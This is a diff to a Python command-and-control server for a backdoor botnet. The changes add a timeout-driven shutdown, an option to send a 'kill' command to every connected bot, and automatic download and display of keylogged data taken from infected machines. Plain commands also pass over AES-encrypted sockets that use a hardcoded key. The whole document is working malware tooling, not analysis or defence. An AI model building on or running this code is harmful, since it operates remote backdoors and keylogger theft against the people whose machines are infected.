@@ -12,7 +12,7 @@ import threading
 import time
 from base64 import b64encode, b64decode
 from random import randrange
-from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
+from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, timeout
 
 # pycryptodome
 # noinspection PyPackageRequirements
@@ -20,6 +20,7 @@ from Crypto.Cipher import AES
 
 connected_sockets = []
 active_bot = 1000
+thr_exit = threading.Event()
 
 
 def connection_gate():
@@ -36,8 +37,18 @@ def connection_gate():
     # Listening...
     s.listen(10)
     while True:
-        so = s
-        conn_gate, addr = so.accept()
+        while True:
+            so = s
+            so.settimeout(60)
+            try:
+                conn_gate, addr = so.accept()
+                break
+            except timeout:
+                if thr_exit.isSet():
+                    break
+                pass
+        if thr_exit.isSet():
+            break
         lengthcrypt = conn_gate.recv(1024).decode('utf-8')
         expected_length = int(decode_aes(lengthcrypt))
         encrypted_received_data: str = ''
@@ -65,6 +76,10 @@ def connection_gate():
                     print("Port is already in use")
                 else:
                     print(exception_gate)
+            if thr_exit.isSet():
+                break
+        if thr_exit.isSet():
+            break
 
 
 def handler(new_so, new_port, username):
@@ -95,6 +110,8 @@ def handler(new_so, new_port, username):
                 # Send encrypted data
                 conn_handler.send(bytes(encrypted, 'utf-8'))
             time.sleep(60)
+            if thr_exit.isSet():
+                break
     conn_handler.close()
 
 
@@ -128,7 +145,7 @@ def sender(data_to_send: str) -> bool:
 
 def receiver(printer=False) -> str:
     """Receive encrypted data and return clear-text string.\n"""
-    lengthcrypt = conn.recv(1024)
+    lengthcrypt = conn.recv(1024).decode('utf-8')
     expected_length = int(decode_aes(lengthcrypt))
     encrypted_received_data: str = ''
     while len(encrypted_received_data) < expected_length:
@@ -238,30 +255,43 @@ def keylogshower():
         keylogged_descriptor = open('keylogged.txt', 'r')
         print(keylogged_descriptor.read())
         keylogged_descriptor.close()
-    except Exception as exception_keylogshower:
-        logging(data_to_log=str(exception_keylogshower), printer=True)
+    except IOError as exception_keylogshower:
+        if exception_keylogshower.errno == 2:
+            logging(
+                data_to_log='It looks like you never downloaded keylogged data from bot!\n Going to download it now for you...\n',
+                printer=True)
+            keylogdownloader()
+            keylogshower()
+        else:
+            logging(data_to_log=str(exception_keylogshower), printer=True)
 
 
 def quit_utility() -> bool:
     # noinspection PyPep8
     """Quit and terminate remote backdoor thread. If mailactivation thread is not running the bot gonna kill himself.\n"""
     global conn
+    global thr_exit
     double_check = ask_input(phrase='Are you sure? yes/no\n')
+    kill_all = ask_input(phrase='Do you want to kill all the bots? yes/no\n')
     if double_check == 'yes':
         for bot in connected_sockets:
             conn = bot['conn']
-            sender('SHquit')
+            if kill_all == 'yes':
+                sender('SHkill')
+            else:
+                sender('SHquit')
             response = receiver()
             if response == 'mistochiudendo':
                 pass
             else:
                 logging(data_to_log=response, printer=True)
+        thr_exit.set()
         return True
     logging(data_to_log='Operation aborted\n', printer=True)
     return False
 
 
-def encode_aes(text_input):
+def encode_aes(text_input: str) -> str:
     """Encode a string and output an json in string form.\n"""
     secret = b'4n4nk353hlli5w311d0n3andI1ik3it!'
     cipher = AES.new(secret, AES.MODE_EAX)
@@ -272,7 +302,7 @@ def encode_aes(text_input):
     return json.dumps(dict(zip(json_k, json_v)))
 
 
-def decode_aes(json_input):
+def decode_aes(json_input: str) -> str:
     """Decode a string in json form and output a string.\n"""
     try:
         b64 = json.loads(json_input)
@@ -371,12 +401,13 @@ class CommandExecutorInput(cmd.Cmd):
 
     # ---------------------------------------------------------------------------------------------
     def default(self, command):
-        sender(command)
-        response = receiver()
-        if response == 'reachedexcept':
-            receiver(printer=True)
-        else:
-            logging(data_to_log=response, printer=True)
+        if command != 'SHquit' and command != 'SHkill':
+            sender(command)
+            response = receiver()
+            if response == 'reachedexcept':
+                receiver(printer=True)
+            else:
+                logging(data_to_log=response, printer=True)
 
     # =============================================================================================
     def precmd(self, line):
@@ -515,5 +546,3 @@ if __name__ == '__main__':
     time.sleep(5)
     # Start command loop
     BotSwitcher().cmdloop()
-
-# TODO: Kill all reamining threads when user quit
